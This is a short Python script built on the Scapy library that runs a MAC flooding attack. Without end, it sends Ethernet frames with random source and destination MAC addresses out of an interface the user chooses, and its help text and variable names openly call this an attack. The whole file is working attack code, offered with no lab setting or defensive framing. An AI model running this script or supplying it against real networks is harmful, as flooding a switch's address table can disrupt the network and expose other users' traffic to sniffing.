#!/usr/bin/env python3


#Import Scapy
from scapy.all import *
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", dest="interface", type=str, required=True, help="Choose the interface to attack")
    args = parser.parse_args()

    return args


def macflood(interface):
    malicious_packet = Ether(src=RandMAC(), dst=RandMAC())
    print ("Starting flooding with MAC addresses...")
    sendp(malicious_packet, iface=args.interface, loop=1, verbose=1)

    

args = get_arguments()
macflood(args.interface)
